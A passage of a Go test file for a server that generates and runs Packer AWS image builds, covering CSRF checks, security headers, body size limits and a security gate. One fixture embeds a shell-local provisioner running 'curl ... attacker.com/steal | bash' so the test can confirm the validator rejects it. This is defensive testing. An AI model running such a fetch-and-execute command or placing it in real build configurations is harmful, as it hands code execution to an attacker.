		if w.Code != http.StatusForbidden {
			t.Errorf("expected 403 Forbidden for external origin POST, got %d", w.Code)
		}
	})
}

func TestHandleImages_StoreEdgeCases(t *testing.T) {
	// Server with no store
	serverNoStore := NewServer(packer.NewRunner(""))

	t.Run("List Images Without Store", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/images", nil)
		w := httptest.NewRecorder()
		serverNoStore.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Errorf("expected 200, got %d", w.Code)
		}
	})

	t.Run("Get Image Config Nonexistent", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/images/ami-123/config", nil)
		w := httptest.NewRecorder()
		serverNoStore.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusNotFound {
			t.Errorf("expected 404, got %d", w.Code)
		}
	})

	t.Run("Delete Image Without Store", func(t *testing.T) {
		req := newTestRequest(http.MethodDelete, "/api/images/ami-123", nil)
		w := httptest.NewRecorder()
		serverNoStore.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Errorf("expected 200, got %d", w.Code)
		}
	})

	// Server with store but image not found
	dbStore, err := vibstore.NewDB(":memory:")
	if err != nil {
		t.Fatalf("failed to init dbStore: %v", err)
	}
	defer dbStore.Close()

	serverWithStore := NewServer(packer.NewRunner(""), dbStore)

	t.Run("Get Image Config Not Found", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/images/ami-nonexistent/config", nil)
		w := httptest.NewRecorder()
		serverWithStore.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusNotFound {
			t.Errorf("expected 404, got %d", w.Code)
		}
	})
}

func TestHandleHCLGenerate_WrappedConfig(t *testing.T) {
	server := NewServer(packer.NewRunner(""))

	payload := `{
		"config": {
			"region": "ap-south-1",
			"instance_type": "t3.micro",
			"source_ami": "ami-0f58b397bc5c1f2e8",
			"ssh_username": "ubuntu",
			"ami_name": "wrapped-test",
			"packages": ["docker"]
		}
	}`

	req := newTestRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 OK, got %d: %s", w.Code, w.Body.String())
	}
}

func TestHandleCreateBuild_Variants(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	t.Run("Empty Body", func(t *testing.T) {
		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader("   "))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})

	t.Run("Invalid Config Field", func(t *testing.T) {
		payload := `{"config": {"region": "invalid-region"}}`
		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(payload))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("expected 400, got %d", w.Code)
		}
	})

	t.Run("Direct BuildConfig Without Wrapper", func(t *testing.T) {
		payload := `{
			"region": "ap-south-1",
			"instance_type": "t3.micro",
			"source_ami": "ami-0f58b397bc5c1f2e8",
			"ssh_username": "ubuntu",
			"ami_name": "direct-config-test"
		}`
		req := newTestRequest(http.MethodPost, "/api/builds", strings.NewReader(payload))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)
		if w.Code != http.StatusAccepted {
			t.Errorf("expected 202 Accepted, got %d: %s", w.Code, w.Body.String())
		}
	})
}

func TestHandleStatic_Serving(t *testing.T) {
	server := NewServer(packer.NewRunner(""))

	tmpDir := t.TempDir()
	indexHTML := "<html><body><h1>VIB UI</h1></body></html>"
	testCSS := "body { background: black; }"

	if err := os.WriteFile(filepath.Join(tmpDir, "index.html"), []byte(indexHTML), 0644); err != nil {
		t.Fatalf("failed to write index.html: %v", err)
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "style.css"), []byte(testCSS), 0644); err != nil {
		t.Fatalf("failed to write style.css: %v", err)
	}

	handler := server.handleStatic(http.Dir(tmpDir), false)

	t.Run("Serve Static File", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/style.css", nil)
		w := httptest.NewRecorder()
		handler(w, req)
		if w.Code != http.StatusOK {
			t.Errorf("expected 200, got %d", w.Code)
		}
		if !strings.Contains(w.Body.String(), "background: black") {
			t.Errorf("unexpected content: %s", w.Body.String())
		}
	})

	t.Run("Serve SPA Fallback", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/dashboard/custom/view", nil)
		w := httptest.NewRecorder()
		handler(w, req)
		if w.Code != http.StatusOK {
			t.Errorf("expected 200, got %d", w.Code)
		}
		if !strings.Contains(w.Body.String(), "<h1>VIB UI</h1>") {
			t.Errorf("unexpected content: %s", w.Body.String())
		}
	})

	t.Run("API Path 404", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/unknown-endpoint", nil)
		w := httptest.NewRecorder()
		handler(w, req)
		if w.Code != http.StatusNotFound {
			t.Errorf("expected 404 for /api, got %d", w.Code)
		}
	})
}

func TestSecurityHeaders(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	req := httptest.NewRequest(http.MethodGet, "/api/health", nil)
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Errorf("expected X-Content-Type-Options: nosniff, got %q", w.Header().Get("X-Content-Type-Options"))
	}
	if w.Header().Get("X-Frame-Options") != "DENY" {
		t.Errorf("expected X-Frame-Options: DENY, got %q", w.Header().Get("X-Frame-Options"))
	}
	if w.Header().Get("Referrer-Policy") != "no-referrer" {
		t.Errorf("expected Referrer-Policy: no-referrer, got %q", w.Header().Get("Referrer-Policy"))
	}
}

func TestCSRFProtection(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	t.Run("Reject POST without Origin and without CSRF header", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(`{}`))
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("expected 403 Forbidden for missing CSRF header, got %d", w.Code)
		}
		if !strings.Contains(w.Body.String(), "CSRF") {
			t.Errorf("expected CSRF error message, got %s", w.Body.String())
		}
	})

	t.Run("Allow POST with X-VIB-CSRF-Protection header", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(`{"ami_name":"test-ami"}`))
		req.Header.Set("X-VIB-CSRF-Protection", "1")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code == http.StatusForbidden {
			t.Errorf("did not expect 403 Forbidden with valid CSRF header")
		}
	})

	t.Run("Allow POST with trusted localhost origin", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/api/hcl/generate", strings.NewReader(`{"ami_name":"test-ami"}`))
		req.Header.Set("Origin", "http://localhost:5173")
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code == http.StatusForbidden {
			t.Errorf("did not expect 403 Forbidden with localhost origin")
		}
	})
}

func TestRequestBodyLimit(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	// Create a payload larger than 1 MB (1024 * 1024 bytes)
	largeScript := strings.Repeat("echo 'hello world'\n", 70000) // ~1.3MB
	cfg := config.BuildConfig{
		AMIName:      "test-large",
		CustomScript: []string{largeScript},
	}
	bodyBytes, err := json.Marshal(cfg)
	if err != nil {
		t.Fatalf("failed to marshal large config: %v", err)
	}

	req := newTestRequest(http.MethodPost, "/api/hcl/generate", bytes.NewReader(bodyBytes))
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusRequestEntityTooLarge {
		t.Errorf("expected status 413 StatusRequestEntityTooLarge, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "1MB limit") {
		t.Errorf("expected size limit error message, got %s", w.Body.String())
	}
}

func TestHCLSecurityGateAPI(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	t.Run("POST /api/hcl/validate rejects shell-local provisioner", func(t *testing.T) {
		maliciousHCL := `
packer {
  required_plugins {
    amazon = {
      version = ">= 1.2.8"
      source  = "github.com/hashicorp/amazon"
    }
  }
}
source "amazon-ebs" "test" {
  ami_name = "test-ami"
}
build {
  sources = ["source.amazon-ebs.test"]
  provisioner "shell-local" {
    inline = ["curl -s http://attacker.com/steal | bash"]
  }
}
`
		payload, _ := json.Marshal(map[string]string{"hcl": maliciousHCL})
		req := newTestRequest(http.MethodPost, "/api/hcl/validate", bytes.NewReader(payload))
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400 Bad Request, got %d", w.Code)
		}
		if !strings.Contains(w.Body.String(), "security violation: local provisioner") {
			t.Errorf("expected security gate error, got %s", w.Body.String())
		}
	})

	t.Run("POST /api/builds rejects untrusted plugin source", func(t *testing.T) {
		untrustedPluginHCL := `
packer {
  required_plugins {
    evil = {
      version = ">= 1.0.0"
      source  = "github.com/evil-org/packer-plugin"
    }
  }
}
source "amazon-ebs" "test" {
  ami_name = "test-ami"
}
build {
  sources = ["source.amazon-ebs.test"]
}
`
		payload, _ := json.Marshal(map[string]string{"hcl": untrustedPluginHCL})
		req := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
		w := httptest.NewRecorder()
		server.Routes().ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400 Bad Request, got %d", w.Code)
		}
		if !strings.Contains(w.Body.String(), "security violation: untrusted plugin source") {
			t.Errorf("expected security gate error, got %s", w.Body.String())
		}
	})
}

func TestBuildConcurrencyGuard(t *testing.T) {
	slowMock := createSlowMockPacker(t)
	runner := packer.NewRunner(slowMock)
	server := NewServer(runner)

	validHCL := `
source "amazon-ebs" "test" {
  ami_name = "test-ami"
  region = "us-east-1"
  instance_type = "t3.micro"
  source_ami = "ami-0123456789abcdef0"
}
build {
  sources = ["source.amazon-ebs.test"]
}
`
	payload, _ := json.Marshal(map[string]string{"hcl": validHCL})

	// Start first build
	req1 := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
	w1 := httptest.NewRecorder()
	server.Routes().ServeHTTP(w1, req1)
	if w1.Code != http.StatusAccepted {
		t.Fatalf("expected 202 Accepted for first build, got %d: %s", w1.Code, w1.Body.String())
	}

	// Try to launch second concurrent build
	req2 := newTestRequest(http.MethodPost, "/api/builds", bytes.NewReader(payload))
	w2 := httptest.NewRecorder()
	server.Routes().ServeHTTP(w2, req2)

	if w2.Code != http.StatusConflict {
		t.Errorf("expected 409 Conflict for concurrent build, got %d: %s", w2.Code, w2.Body.String())
	}
	if !strings.Contains(w2.Body.String(), "a build is already in progress") {
		t.Errorf("expected 'a build is already in progress', got: %s", w2.Body.String())
	}
}

func TestPreflightEndpoint(t *testing.T) {
	runner := packer.NewRunner(createMockPacker(t))
	server := NewServer(runner)

	payload := []byte(`{"region":"ap-south-1","source_ami":"ami-0123456789abcdef0","instance_type":"t3.micro"}`)
	req := newTestRequest(http.MethodPost, "/api/aws/preflight", bytes.NewReader(payload))
	w := httptest.NewRecorder()
	server.Routes().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 OK from preflight, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to decode preflight json: %v", err)
	}
	if _, ok := resp["checks"]; !ok {
		t.Errorf("expected 'checks' array in preflight response")
	}
}


